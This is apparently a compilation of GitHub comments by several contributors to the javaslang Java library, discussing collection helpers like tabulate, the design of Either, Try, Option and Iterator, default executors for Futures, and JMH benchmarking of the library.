    "simonecarriero": "Hi,\nabout the static helper method in Collections we were talking about in #984 I think there are two options.\nThe first one is to return an array of elements, to be passed to the of(T...) method\nstatic <T> T[] tabulate(int n, Function<? super Integer, ? extends T> f) {\n    n = n < 0 ? 0 : n;\n    @SuppressWarnings(\"unchecked\")\n    T[] elements = (T[]) new Object[n];\n    for (int i = 0; i < n; i++) {\n        elements[i] = f.apply(i);\n    }\n    return elements;\n}\nThe second one is to return an iterator, to be passed to the ofAll(Iterable) method\n```\nstatic  Iterable tabulate(int n, Function<? super Integer, ? extends T> f) {\n    Objects.requireNonNull(f, \"f is null\");\n    return new AbstractIterator() {\n    int i = 0;\n\n    @Override\n    public boolean hasNext() {\n        return i < n;\n    }\n\n    @Override\n    protected T getNext() {\n        return f.apply(i++);\n    }\n};\n\n}\n```\nThe bad thing of the first approach is that we have to iterate through the elements twice, one inside Collections.tabulate and one inside of(T...). With the second approach we iterate only once, inside ofAll(Iterator).\nThoughts?\n. I have an issue due to generics implementing HashMap.tabulate.\nGiven this Collections.tabulate\njava\nstatic <C extends Traversable<T>, T> C tabulate(int n, Function<? super Integer, ? extends T> f, C empty, Function<T[], C> of) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (n <= 0) {\n        return empty;\n    } else {\n        @SuppressWarnings(\"unchecked\")\n        T[] elements = (T[]) new Object[n];\n        for (int i = 0; i < n; i++) {\n            elements[i] = f.apply(i);\n        }\n        return of.apply(elements);\n    }\n}\nAnd this HashMap.tabulate\njava\npublic static <K, V> HashMap<K, V> tabulate(Integer n, Function<? super Integer, ? extends Tuple2<? extends K, ? extends V>> f) {\n    return Collections.tabulate(n, (Function<? super Integer, ? extends Tuple2<K, V>>) f, HashMap.empty(), HashMap::ofEntries);\n}\nHashMap.tabulate(2, i -> new Tuple2<>(i,i)) fails with a java.lang.ClassCastException: [Ljava.lang.Object; cannot be cast to [Ljavaslang.Tuple2; at the linereturn of.apply(elements); of Collections.tabulate\nReplacing Collections.tabulate with the following one everything works fine, but i would avoid it if possible. Any idea?\njava\nstatic <C extends Traversable<T>, T> C tabulate(int n, Function<? super Integer, ? extends T> f, C empty, Function<Iterator<T>, C> of) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (n <= 0) {\n        return empty;\n    } else {\n        @SuppressWarnings(\"unchecked\")\n        java.util.List<T> l = new java.util.ArrayList<>();\n        for (int i = 0; i < n; i++) {\n            l.add(f.apply(i));\n        }\n        return of.apply(Iterator.ofAll(l));\n    }\n}\n. With Lists everything works fine. Probably the point is that the cast is present only for Maps. With Array, List and so on the cast it's simply not done! Notice that the exception is not on T[] elements = (T[]) new Object[n] but on of.apply(elements), so it's the type-erasure cast.\nCollections.tabulate takes a parameter of type Function<T[], List<T>>.\nIn the case of Array, List, etc, the type of the function we are passing is exactly the same. I think the compiler doesn't put a cast to call it with elements as argument, because the type of elements is exactly T[]\nIn the case of HashMap, the input type of the function is an actual type, not T (the type of f is Function<Tuple2<? extends K, ? extends V>[], HashMap<K, V>> and not Function<T[], List<T>>). In this case instead, the compiler needs to cast it from T[] to Tuple2[].\n. OK, I'll do it. Thank you guys!\nOn Jan 5, 2016 8:47 PM, \"Daniel Dietrich\" notifications@github.com wrote:\n\nthx @simonecarriero https://github.com/simonecarriero @ruslansennov\nhttps://github.com/ruslansennov ok, it is good that all works for List,\nArray etc.\nThen let's take the tabulate method for HashMap that returns an Iterator,\nit is fine!\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/javaslang/javaslang/issues/659#issuecomment-169109425\n.\n. Yes sure :+1: \n. I did this as part of #659, Tree.of was needed to implement the tabulate method.\n. Iterator.tabulate and Iterator.fill are not covered by tests yet. Once i implement tabulate and fill for Maps and Sets I can move tests up in the hierarchy (from AbstractSeqTest to AbstractTraversableTest) so also Iterator will be covered\n. Yes but...at this point I could also refactor all the other tabulate (List, Vector, Array, ...) to just call XXX.ofAll(Iterator.tabulate(n,f)).\nWhat do you think?\n. Ok I'll take a look! But you said to use Iterator.tabulate for Maps and Sets. In that case it's not lazy right?\n. why this? empty() is implemented as new Vector<>(HashArrayMappedTrie.empty())\n. I get an unchecked cast warning without this annotation (required: T[], found: java.lang.Object[])\n. Ok, got it. So is ofAll(Iterable) broken with respect to this semantic? The following test is red\n\n@Test\npublic void t() {\n    Object[] c = new Object[0];\n    Vector<Object> v = Vector.ofAll(Array.of(c));\n    assertThat(v).isSameAs(Vector.empty());\n}\n. It's OK to use n it the loop condition, if it's negative the condition is always false. The nOrZero is necessary only to create the array, to avoid a NegativeArraySizeException.\nAnyway, I didn't reassigned the parameter because I'm used to get a checkstyle error :smile: but in this case it's pretty clear, I'll go with n = n < 0 ? 0 : n :+1: \n. Sure, I'll do it\n. I avoided this on purpose, my point is that doing in this way we call f in the reverse order, from f(n-1) to f(0). In case of pure functions this is fine, but if f is a weird stateful function, we get some inconsistencies between different implementations of Seq.\nFor example, given the following function\njava.util.LinkedList<Integer> ints = new java.util.LinkedList<>(Arrays.asList(0, 1, 2));\nFunction<Integer, Integer> f = i -> ints.remove();\nArray.fill(3, f) returns Array(0, 1, 2) but List.fill(3, f) returns List(2, 1, 0)\n. Yes they are singleton. The tests defined in AbstractTraversableTest don't work for Maps because AbstractMapTest::empty() returns an IntMap. I add another method emptyMapShouldBeSingleton to manage on which subclasses of Map the tests should be run.\n. No, the tests defined in AbstractTraversableTest would not pass with subclasses of Map, because AbstractMapTest::empty() returns IntMap.of(emptyMap()). The Map hierarchy has its own set of tests using emptyMap() instead!\n. ",
    "hamnis": "Some links to code.\nhttps://github.com/scalaz/scalaz/blob/series/7.2.x/core/src/main/scala/scalaz/Either.scala\nhttps://github.com/non/cats/blob/master/core/src/main/scala/cats/data/Xor.scala\nUse would then be a just a normal monad.\nexample of \\/\n``` scala\nval c = for {\n a <- \\/.right(\"hello\")\n b <- \\/.right(\"meh\")\n} yield { a + \" \" + b }\nprintln(c)\n// \\/-(\"hello meh\")\n```\nLeft side operation will shortcut as expected. Use would be more Option like.\n. When writing Scala, I never use scala.Either. In almost all cases I want a right biased Either like scalaz.\\/ or cats.data.Xor. \nIf I need aggregation of errors, I need a Applicative functor, so scalaz.Validation works better there.\n. > ...as static factory methods of interface Either, right? You suggest not to expose the specific type, like so, right?\nCorrect. \nFor some reason I have removed all examples I had for the failing type inference.\nI remember that I quickly got cyclic inference whenever I was working with Eithers.\nThe general case is actually not option, but Either.fold\nDefinition of Either.fold.\n``` java\ninterface Either {\n   C fold(Function leftF, Function rightf);\n}\nclass Right {\npublic  C fold(Function leftF, Function rightf) {\n    rightf.apply(this.right.get());\n  }\n}\nclass Left {\npublic  C fold(Function leftf, Function rightf) {\n    leftf.apply(this.left().getLeftValue());\n  }\n}\n```\nEverything else can be implemented in terms of fold.\nexample of use:\njava\neither.fold(ex => Option.none(), Option::of);\n. Hi Daniel.\nAs long as the library modules are contained within one git project, convention dictates that all modules are versioned the same.\nYou might also distribute an \"all\" jar that contains everything, then users can pick and choose.\nDoing this early might help with adoption, at least for my own part. It can potentially also showcase dependency problems between classes, if there are any.\n. When I say modularization i just mean Jar files. Optional Dependencies which I may pick and choose what I need from. A project may have as many jar files it wants, even if a jar file only contains one class.\nSometimes i just have to write the thing I need where I need it, since adding a increasingly bigger library doesn't really benefit my users if I only need one class or method.\nThe Value thing is sometimes useful, I see that.This seems like just a way to avoid having to repeat yourself, which is of course a noble goal. If it, however, introduces a dependency which is not really needed, then maybe not keeping it DRY is better. Your milage may vary.\nThe property checking framework should probably be in its own git project with its own release cycle.\nFunctional Java is also not modularized in this fashion, and is one of my main problems with it.\n. As a side note I am becoming more and more fan of a more typeclass based design. Keeping things DRY, but having code that relates to the class outside the class if's only useful sometimes.\n. No, i have a lib that depends on javaslang 1. I am in the process of upgrading, but everything takes time. I have released a version of my lib that uses the workaround.\n. @paplorinc as partial fix, that is fine. I would still really want more =). @danieldietrich encoding and decoding into user defined types.\nhttps://github.com/hamnis/immutable-json/blob/master/codec/src/main/java/net/hamnaberg/json/codec/Codecs.java#L326\nhttps://github.com/hamnis/immutable-json/blob/master/codec/src/main/java/net/hamnaberg/json/extract/Extractors.java#L88\nuse:\nhttps://github.com/hamnis/immutable-json/blob/master/codec/src/test/java/net/hamnaberg/json/extract/ExtractorsTest.java#L40-L47. @ruslansennov done. Could this please be merged?. I think Either should be in core.. Both signatures are useful. I am using the first version quite extensively. I would strongly suggest that both be available.\nMaybe the original can be made available through sequenceU which most closely matches scalaz Traversable type class.. I need that implementation to be monadic, so I guess i will have to keep my own version. It is more interesting to have the types align than the collection of all the errors, If i needed that I would use Validation.. Here is a version that is monadic:\njava\npublic static <L, R> Either<L, List<R>> sequenceM(List<Either<L, R>> eithers) {\n        return eithers.foldLeft(Either.<L, List<R>>right(List.empty()), (acc, item) -> acc.flatMap(list -> item.map(list::prepend))).map(List::reverse);\n    }. Any either where the next step would be to either work with the sequenced operation with the set Left side.\nHere is a slighly adapted example from our codebase\nOptionTEither is a Option MonadTransformer focused on Either.\njava\nOptionTEither.wrap(bankCustomer).flatMap(customer -> OptionTEither.<BankError, AccountInformation>lift(customer.getAccount()).flatMapF(acc -> {\n            return sequenceM(documents.map(tuple -> tuple.apply((name, bundles) -> {\n                return sequenceM(bundles.map(bundle -> createAgreementDocumentBundle(principal, bundle, acc.getNumber(), Option.none()))).map(list -> PDF.merge(name, list.flatMap(Function.identity())));\n            })).toList()).map(Option::some);\n        })).unwrap().flatMap(opt -> opt.toRight(BankError.internal(\"Customer or account not found\")));\nThe returntype of the above Expression is: Either<BankError, List<AgreementDocument>>. I have found Tuples useful up to Arity 27 =). Everything depends on context. If you are for instance decoding|encoding Json, as I am in this case, then it becomes useful. Since each field may be of a different type, I want to be type safe as far as possible. A map is not.. the only value that can exist for Void is null. there is way to instantiate Void.. there could be an overload that accept a Consumer<E>, and handles this interally.. Well. because of the Java typesystem this is not really correct. Since we cannot infer the inner type the Try is supposed to have, it will have to be a new method not an overload. Changing the return type to Try<Void> is probably not what you expected.. java\nstatic <X extends Throwable> Try<Void> recoverUnit(Try<Void> tried, Class<X> exception, Consumer<? super X> f) {\n        return tried.recover(exception, ex -> {\n            f.accept(ex);\n            return null;\n        });\n    }. For all your parameter needs, you can take a look at https://github.com/hamnis/arities\nCode generation for all types of function arities, tuples, and some checked variants thrown in for good measure.. Sure. Will fix.. I squashed the commits into one, and fixed the parameter names,. ",
    "mvh77": "I've released Javactic 1.0.0-RC1 based on javaslang 2.0.0-RC2 (http://search.maven.org/#artifactdetails%7Ccom.github.javactic%7Cjavactic%7C1.0.0-RC1%7Cjar) Documentation here: http://javactic.github.io/javactic/ \n. Is there an existing (Scala) implementation of Xor? I'm working on a Java port of Scalactic Or and Every (http://www.scalactic.org/user_guide/OrAndEvery) that's based on javaslang 2.\n. Yes, soon. :)\n. Ok. I started implementing endsWith on Seq and noticed that startsWith is implemented in IndexedSeq, LinearSeq & Queue when it could (just like in Scala) be implemented just in Seq. Is there a reason for that? Maybe the one in IndexedSeq is more efficient if iterator.drop is not optimised for indexed sequences?\n. Ok, so next question is, should the argument be a Seq and not an Iterable? endsWith 'needs' a Seq, because you need to know the size upfront (unless you want to iterate over it once to get the size, but that's ugly). In Scala, they take a GenSeq.\n. Well, I think if you need a Seq you should ask for a Seq. Hiding  the fact that supplying a Seq is more optimal than someting else will not be visible to the caller. Instead, if you ask for a Seq the caller might be able to work with a Seq to begin with, and he will be made aware of the performance hit of transforming his Iterable into a Seq if he has to do it himself. Just my .02$ :smile:\n. YES! I'm glad we think alike on this issue!\n. > I hope my comments aren't too boring :-)\nI'll see how it affects my motivation going forward! :stuck_out_tongue_winking_eye: I don't like unnecessary braces, some people do (plenty of them here at work!), but let's do it your way, it's your project! :smile: \n. Ok, fixed the issues you mentioned. I had to put back a few casts elsewhere that had been removed two days ago otherwise it doesn't compile in Eclipse.\n. Maybe it's not the first thing to optimize. Does anybody even use those methods? :smile:  I didn't see the Scala library use any optimized versions. Maybe for now one optimization would be to change the first for loop in scanRight to use the reverseIterator which is optimized for indexedSeqs\njava\n        Iterator<T> it = Seq.ofAll(this).reverseIterator();\n        while(it.hasNext()){\n            acc = operation.apply(it.next(), acc);\n            scanned = scanned.prepend(acc);\n        }\n. It should be left of course!  My bad! But that gives you the original problem I had, which is an exception!\nException in thread \"main\" java.util.NoSuchElementException: Either.right().get() on Left\n. On your other comment above, would it make sense to have also static constructors on implementation classes, so you'd have Right.of(), Left.of(), Some.of(), Tuple2.of() to be in line with the 'static' contructors  of Scala. I know there are static constructors on the base type (like Option.of) already. Sometimes these behave differently in Scala though (Option(null) vs Some(null)).\n. Hmm.. but we have static init methods on all collections, so this seems like a discrepency to me. I can say Vector.of(\"foo\") but not Some.of(\"foo\"). A static \".of()\"  seems to me like Scala's apply on an companion Object, so Some(\"foo\") in Scala would translate to Some.of(\"foo\") in Java. Anyway, my .02$ as usual. :smile: \n. No no, I think it should be Some.of, not Option.some, + Left.of, Right.of, etc. Or did we have a misunderstanding?\n. So how close to Scala do we want to be on these things concerning nulls? I notice that currently the constructors do null checks, but Scala doesn't disallow null. Here's what the worksheet says:\n``` scala\nval fail  = Failure(null)    //> fail  : scala.util.Failure[Nothing] = Failure(null)\nval succ  = Success(null)    //> succ  : scala.util.Success[Null] = Success(null)\nval try_  = Try(null)        //> try_  : scala.util.Try[Null] = Success(null)\nval some   = Some(null)      //> some  : Some[Null] = Some(null)\nval option = Option(null)    //> option  : Option[Null] = None\nval left  = Left(null)       //> left  : scala.util.Left[Null,Nothing] = Left(null)\nval right = Right(null)      //> right  : scala.util.Right[Nothing,Null] = Right(null)\n```\nNotice that Try(null) becomes Success(null) but Option(null) becomes None.\n. Thanks! Official release of Javactic once Javaslang 2 is out!\n. What does that mean technically?\n. Yes, I was talking more about method naming than variance things, sorry for mixing that in there. So I would have this (on Try for example), would this fulfill all use cases?\njava\n    T      get();\n    T      getOrElse(T def);\n    T      getOrElse(Supplier<? extends T> def);\n    Try<T> orElse(Try<? extends T> alt);\n    Try<T> orElse(Supplier<? extends Try<? extends T>> alt);\n    Try<T> recover(Function<? super Throwable, ? extends T> func);\n<U> Try<T> recoverWith(Function<? super Throwable, ? extends Try<U>> func);\nand so the functionality from the current orElseGet(Function<? super Throwable, ? extends T> other) can be gotten with a call to recover(...).get(). I'm not familiar enough with the use cases for orElseRun,  orElseThrow and orElseTry to know if these are really useful.\n. Sure go ahead! I really like it how you are open to suggestions, very easy to work with! :smile: I would maybe remove orElseRun, orElseThrow and orElseTry for now unless you come up with good names for them. They can always be added later on, but renaming/removing them once they are there is more difficult. The methods above are the ones I have in Or in Javactic right now. :wink:  http://javactic.github.io/javactic/javadoc/ \n. as they are terminal operations, maybe just orRun, orThrow, orTry?\n. sorry, only orElseRun is terminal...\n. Yes you're right, that orNull is inconsistent in Scala, but getOrElse(null) should be enough for the very rare cases where you want a null out.\n. Personally I like your first approach better with the more specific types.\n. No need to fix anything, RC3 works fine?\njava\nList<Double> slangDoubles = List.of(42d, 99d);\nList<Number> slangNumbers = List.ofAll(slangDoubles);\nslangNumbers.contains(42d);\n. I mean that the generated javadoc, when it comes to stadard library classes, refers to java 6. For example if you go to Option.filter and click on the Predicate link, it'll take you to the java 6 page for Predicate, which does not exist.\nhttp://javaslang.com/javadoc/2.0.0-RC3/javaslang/control/Option.html#filter-java.util.function.Predicate-\nJavadoc and the maven javadoc plugin have a 'links' part where you can specify where to find the external links. Here's an example, but you don't seem to have the javadoc generation in the pom.\nhttps://github.com/javactic/javactic/blob/master/pom.xml\n. Oh, I hadn't seen that isDefined was already on Value. Makes sense though. But is the meaning of that obvious? What is it on an Either or a Try? Is a List not defined when it's empty? Anyway, I guess we can live without.\n. Well, if you want my honest opinion, I don't see the benefit in having the Value type, because I'm never going to reason around that in an app. This is a bit like Functors and Monads, my business logic is never going to abstract around those lines, in any app. Maybe you could remove both nonEmpty & isDefined from Value (leaving only isEmpty) and add nonEmpty to Traversable and isDefined to Option and see if Either/Try etc need any of those. Just an idea.\n. As a side question, what is the point in Option#nothing(): Option<Void>? Because Void is a real bastard, it's neither the terminal object (scala's Unit) nor the bottom type (scala's Nothing). Option<Tuple0> could maybe make some sense in some situations where you want a Some without a value, but I'd avoid Void all the time.\n. Well it will clash with the static empty() constructor, so that's not good, but if it's not used right now internally, I'd leave it out for now, it can always be added later. Like Josh Bloch said on API design, \"when in doubt, leave it out!\". :smile: \n. Yes, Optional is garbage, Option is great, no touch! :smiley: \n. I'll try to do this tonight.\n. Btw I have a problem with IntelliJ giving me:\n....../javaslang/javaslang/target/generated-sources/annotations/javaslang/Patterns.java\nError:(10, 14) java: duplicate class: javaslang.Patterns\nI couldn't run test cases in IntelliJ, had to do it on the command line, really annoying. Is this a known issue?\n. Hi,\nOk, I'm not suggesting changing every method that can throw an exception, just maybe the ones that throw ClassCastException. This is because changing a type shouldn't lead to runtime exceptions. Of course Option#get() has to throw an exception if the option is not defined, this is the way it's in Scala too. But if you feel there are too many of these and it makes it difficult, let's keep it as it is.\n. One option is to just remove the sorted() method since you can do this and it's type safe:\njava\nVector<Integer> vec = Vector.of(1,2,3);\nvec.sorted(Comparator.naturalOrder());\nIf you change the type of vec to Object, the sorted call doesn't compile anymore.\n. Ok, no problem. I don't think following Java8 api's too closely is a very good idea, but I understand your point. :wink: \n. Yes you're right, it's a bit complex. Also the behaviour is not necessarily obvious since some methods (get, contains, iterator, keys, etc) are not affected and invoking transformer methods (e.g. map) will not preserve the default value. The only real advantage is you can transform a map from a partial function to a full function. This could be solved with a static method on Map that would return a wraper that only affects the apply method...\n. Well, since we have get() that returns an Option, I wouldn't touch apply, and would have that throw just like it does currently and in Scala. Unless we want to change that everywhere, meaning for Seqs and Sets as well? Where else?\nBut your last example is what I also came up with, meaning just returning a Function1. We could have something similar to Scala signature wise:\n``` java\ndefault Function1 withDefaultValue(V def) {\n    return k -> get(k).getOrElse(def);\n}\ndefault Function1 withDefault(Function<? super K, ? extends V> def)  {\n    return k -> get(k).getOrElse(() -> def.apply(k));\n}\n```\nWould this make sense?\n. Except that Sets of course are already full functions from T -> Boolean :smile: \n. Looking at Seq I'm a bit puzzled by the static lift method on Function1. Should we also have an instance method lift on maybe Seq and Map that returns an Option returning Function1? Map already has get():Option so it's redundant, but Scala has this too. Seq has no way to get an Option from an index at this moment.\n. Meaning Javaslang won't be found on NPM after all? :stuck_out_tongue_winking_eye: \n. You can also check out Scalactic Chain which is a non empty list and Every which is a non empty vector:\nhttp://doc.scalatest.org/2.2.4/index.html#org.scalactic.Chain\nhttp://doc.scalatest.org/2.2.4/index.html#org.scalactic.Every\nI hope you don't plan on doing any API breaking changes in any future minor milestone?\n. It's not the same code, but that's not the point. The point is that since Iterator is an Iterable, you can pass it to any method that expects an Iterable, and an Iterable is supposed to give you iterators that you can traverse the collection with. An Iterator can be iterated once, but an Iterable must provide new Iterators on all calls to iterator(). The method receiving the Iterable has no way to know that the Iterable provides the same Iterator every time.\nIterator needs to keep a reference to the sequence it was created with, that's how it can create new iterators on every call.\n. That's not a caveat that can be lived with. Iterator cannot extend Iterable if changing that is impossible...but I'm not convinced that it is.\nI don't understand what your example shows. :smile: \n. Ahh f*#$ this is a nightmare, anything that takes an Iterable can break if given a javaslang Iterator... Iterator#iterator() should at least throw an UnsupportedOperationException or something.\n. I think it is a major problem, and not because of Scala, I think that is secondary. An IteraBLE is something you can iterate over, like a collection/stream. An IteraTOR is not something you can iterate over, it's the thing you iterate with.\nIn scala if you map over a list you immediately get a new list, so if you want to chain functionality in an efficient way without generating a new list every time, you transform it into an iterator first. Basically the same as a java stream, right? Just a wrapper for transformation functionality. I think that's what we should aim for as well. I don't see what benefits we get from having Iterator extend Traversable.\nI guess this cannot be changed in 2.x.x, but what if in 3.0 Iterator only extends java.util.Iterator, and not Traversable and Value? Would that be a major problem?\n. Looks good to me! :+1: \n. Definitely not! You're probably not using Javaslang if you don't understand the concept behind an Option.\n. I've seen cases where you actually want to do stuff when you get a None. So you have ugly code like:\njava\nif(option.isDefined())\n  doSomthing(option.get());\nelse\n  logThatWeGotNothing();\nIn Scala you'd obviously use a pattern match, but in Java you sometimes have to do stuff like that, forEach isn't enough.\n. Is this really necessary? You can just do .toJavaStream() and call collect(...) on that.\n. I'm not really against it and I thought about it myself some time ago, but it's a bit bloaty in my opinion since you can do without and it's something you need very rarely. And btw, Option is a kind of collection! :wink: \n. Is anybody working on this?\n. In Scala I think it's all handled in Try, but Try only catches non-fatal exceptions (http://www.scala-lang.org/api/2.12.x/scala/util/control/NonFatal$.html). InterruptedException is fatal and is therefore not caught, but remember that Scala doesn't have checked exceptions (as this is only a Java compiler feature).\n. Well, let's think about it. I didn't mean that we can't do anything, just that we can't do it like it's done in Scala. :smile: How about this:\njava\nstatic <T> Try<T> of(CheckedSupplier<? extends T> supplier) {\n    try {\n        return new Success<>(supplier.get());\n    } catch (VirtualMachineError | ThreadDeath | LinkageError fatal) {\n        throw fatal;\n    } catch (Throwable t) {\n        if(t instanceof InterruptedException) {\n            // can't catch it, compiler says it's never thrown\n            // here we could:\n            // a) throw new RuntimeInterruptedException(t); // new exception type\n            // b) Thread.currentThread().interrupt();\n        }\n        return new Failure<>(t);\n    }\n}\nSolution a) would be closest to Scala, meaning stuff like this would blow in your face immediately:\njava\nTry.of(() -> { throw new InterruptedException(); });\nbut it introduces a new exception (unless we just use a RuntimeException but I don't really like that). Solution b) does what all text books tell us to do, to interrupt the thread. I think we should definitely do either one but I'm not sure which one. :smile: ...maybe a).\n. Btw the documentation on NonFatalException#of seems to be wrong, it says that \"InterruptedException ... is not thrown as fatal exception\" yet the code seems to do just that.. Either is right biased, so get() actually returns the value if it's a Right.\n. Please close, this is the way it works everywhere (Option, Try, etc...).\n. I think having a default executor has a few problems. One of them is that the executor will hang around until its threads are cleaned up, which seems to be around 1min with the jdk cached thread pool. This means if you run unit tests that use Futures your test will complete 1min after it's really finished, unless you explicitly shutdown the executor, and this even if you don't use the default executor and give your own on all operations. The default executor should be lazy.\nI've personally been experimenting with the idea of an ExecutionContext that you create by giving it your Executor and you can only get futures and promises from that EC. This way there are no hidden executors hanging around and the user has full power over the threads the tasks are executed on.. Hi. I don't think a shutdown hook helps very much, at least in the case I mentioned as it would be executed only after the 1min. I have my version here (javadocs probably aren't up to date).\nWith an execution context it would also be possible to have a configurable policy on how to handle fatal vs. non-fatal exceptions (if there's no satisfactory solution to that problem yet).. Hi. I pretty much copied the unzip method, and that one actually had xs.length() == 0, but anyway, you're right, now that I look at it with my brains on the isEmpty makes no sense. :)\n. Yeah it isn't, it comes from the unzip method. That's what you get copying other people's code. :)\n. actually here if it's null it calls the super method that has the null check! :wink: \n. no, scanRight takes a Traversable. Traversables don't have a reverse, it has to be reversed in case it isn't a Seq.\n. possible, but we still need to have that reverse (actually should be reversed if we copy Scala) method. in an interface it will be visible.\n. it should actually go to Traversable then, like in Scala.\n. I like the idea of putting it in Traversable, cleaner, but we need a Utils class for that static reverse method. What do you think?\n. ah, it doesn't work, you'd have to implemet it on every interface. on Iterator it would.\n. well, I guess it's the functions responsibility to handle it, so why not.\n. ",
    "malduarte": "@danieldietrich : Is using jmh (http://openjdk.java.net/projects/code-tools/jmh/) an option? \n. @danieldietrich Happy to contribute in this area :)\n. @mping That's a really good post. Serious benchmarking is really hard. \n\nAt this point, most people make the major mistake: they run with these numbers as if they are the truth. But these numbers are just data, they don\u2019t mean anything unless we extract the insights out of them. To do that, we need to see why the numbers are like that.\n. @danieldietrich , @mping  Added https://github.com/javaslang/javaslang/pull/1187. Currently only the javaslang implementations. Next step will be to provide Scala implementation of the same benchmarks\n. @danieldietrich I'm happy to contribute to the blog post. That being said I wouldn't be comfortable to make a blog post with the current use cases - they're a start but we need more insights before we try to have a meaningful discussion. Posts on benchmarks are likely to fuel flame wars :). I would prefer to add composite operations (say, groupBy, distinct elements etc) also. What do you think?\n. Done!\n. Done! Happy to contribute.  By the way, since I'm proposing support for arrays, I might as well add for other collections. Would that be ok @danieldietrich ?\n. done\n. \n",
    "mping": "The blog (from one of the authors I think) has some really neat code: http://shipilev.net/blog/2016/arrays-wisdom-ancients/#_benchmark\n@malduarte I can also lend a hand\n. @danieldietrich @malduarte  after much fiddling with maven, I got something here: https://github.com/javaslang/javaslang/pull/1162\nI haven't touched maven/java for a while, so feel free to comment\n. @malduarte great! Gonna take it for a spin\n. @danieldietrich I'm gonna try and find some time, will post PR for review and comments.\n. @danieldietrich let me know how is it looking in #1456 \n. Thanks Daniel, I saw that @paplorinc updated the code. \n. @paplorinc of course not, I'm glad you did it so I can learn. I think the For benchmark gets most of the penalty because of collection, but I'm kinda busy to investigate right now :). I'm glad you guys are constantly working on javaslang.\n. @danieldietrich this is just preliminary to see if the general outline of the test looks good.\nI've actually never used javaslang in my projects so let me know if it doesn't look good.\n. Tests are failing because of OOM, since For comprehension essentially does a cross product I'll use smaller arrays.\n. Tests should be simpler now, here's what I have (cannot explain the 2nd result)\nRatios slang / <alternative_impl>\nTarget        Operation                   Ratio                              10 \nForBenchmark  ForComprehension1Iterator   javaslang_for/java_for          0,88x\nForBenchmark  ForComprehension2Iterators  javaslang_for/java_for         11,89x\n. Will use a xor, thanks.\n. Geez, I'm getting horrible results with the XOR trick. @paplorinc can you share you idea with some code? I'm currently doing this:\nOptional<Integer> res = For(ELEMENTS, ELEMENTS).yield((i, j) -> i ^ j).collect(XOR);\nBut the results are horrible in comparison to the nested for. I'm guessing I am doing something wrong, feel free to point me in the right direction.\n. Cool, I will proceed then, and add more benchmarks, for the rest of the idioms.\nThe For().yield implementation is quite simple via flatmap but I was wondering if it wouldn't be better to just nest the loops to squeeze more performance.\n. Added a couple more benchmarks, now only pattern matching is missing.\n```\nRatios  / slang\nTarget        Operation                                                                          Ratio           \n-- try -- \nTryBenchmark  TryThrowsCatchBenchmark         java_try_actual_exception/javaslang_try_actual_exception     2,20x\nTryBenchmark  TryNoThrowsCatchBenchmark               java_try_no_exception/javaslang_try_no_exception     0,87x\n-- tuple --\nTupleBenchmark  Tuple2Benchmark       java_tuple2_creation/javaslang_tuple2_creation     1,00x\n-- for comprehension  --\nForBenchmark  ForComprehensionNestedFor       java_for/javaslang_for    11,47x\n``\n. Sorry for the delay guys, was out in vacation for a week. Will try to implement suggestions ASAP.\n. No I don't. Will check it out today. Was an assert that failed :(\n@danieldietrich is there a report for the benchmarks generated anywhere? would love to write a blog post on this.\n. I appreciate everyone's advice and input, I realize it's very tricky to interpret the results but my goal was never to provide an accurate measurement. I just want to get an idea of what to expect in terms of performance. I know using JMH is hard, but I think this is a good and practical way to learn \n. @danieldietrich yay thanks!\n. The benchmark profile was removed, you can run it like this:mvn test -pl javaslang-benchmark. The profile doesn't exist anymore, so I update the docs to run the benchmarks only.plstands for project list I guess.\n. will update, didnt notice it was triggering CI.\n. my bad, was a typo.0wasn't suppose to be there \n. you're absolutely right, like I said just wanted to get a feel of it. In particular I never used thefor` comprehension so I would not know what would be the right way. Do you have any suggestions on how to properly test it? My rationale was that reduce code was the same in both cases (broken logic I know).\nThe for comprehension acts both as a map and as a consumer, so I dont exactly know what's the best way to test.\n. Just needed something to ensure the assert is simple.\n. Gonna fix it. Forgot to commit.\n. Forgot to commit/push, thus causing the OOM.\nI'm open to suggestions on how to improve the tests, essentially from what I could see the For comprehension is sugar for nested for loops: http://static.javadoc.io/io.javaslang/javaslang/2.0.2/javaslang/API.html\nPlease feel free to suggest on how to test it properly, IMHO the pure java should have at least a nested foreach.\nI made three examples because I imagine most code has 2 to 3 nested foreach.\n. This is what I saw:\n45: astore_3\n      46: aload_1\n      47: aload_3\n      48: invokevirtual #19                 // Method java/lang/Integer.intValue:()I\n      51: iconst_0\n      52: imul\n      53: invokestatic  #20                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;\n      56: invokeinterface #21,  2           // InterfaceMethod java/util/List.add:(Ljava/lang/Object;)Z\nI don't know how to check if the mult is elided, but like I said please feel free to point me in the right direction.\n. Blackhole is from JMH and is designed for the case where you don't need/want to check the result but you do want to prevent DCE, so it's basically something to emulate a side-effect function.\n. I'm going to go for the xor because of added benefit of validity, as soon as I have some free time.\n. You're right, I just need a list.\n. My benchmarks seemed wildly different:\nForBenchmark  ForComprehension1Iterator   javaslang_for/java_for          0,88x\nForBenchmark  ForComprehension2Iterators  javaslang_for/java_for         11,89x\nGonna simplify and make sure there's nothing wrong, after the xor.\n. Problem is that the For comprehension mostly makes sense for nested iterations, otherwise you could use a regular map. I'd like the benchmark to be similar to real-world usage, since it is comparing common idioms IMHO.\n. Oops, too much copy/paste. Will fix.\n. Yeah looks nicer, will use that - when it's merged\n. Since it was merged, I can use it now.\n. I'm just trying to write a method that throws/doesn't throw in a way that the VM doesn't optimize away.\nNot entirely sure that this is the best way though. As usual, open to suggestions.\n. Will do.\n. Will do.\n. I don't know if the JVM will determine that a method always throws an exception and inline/optimize away some ifs in case it determines some branches aren't possible. Dunno if it can actually happen, though.\nI guess I can measure it :)\n. Was afraid that the JVM would magically elide the unreachable branch. Will simplify, I guess the JVM is not that smart. The samples are really cool, thanks!\n. Because in the \"plain java\" benchmark, if the jvm figures out one of the branches is not reachable due to a method never/always throwing an exception, the comparison is not really fair. In real life code, it would be much harder to figure out that a branch is not reachable.\nMaybe I'm overreaching here :)\n. Sorry for mistakes, will fix all aforementioned issues. \nI was on vacation, so didn't have much time to work on this, but hopefully will fix the PR today.\nThanks again everyone for your patience.\n. ",
    "fredshonorio": "Ah, I haven't tried 2.0 yet. Any particular reason to remove the package?\n. It would be just a \"nice-to-have\", I would not care about the class of the exception, in my case I just want a clearer message to log.\nIf you think this is out of scope, that's fine.\nAnyway, thanks.\n. ",
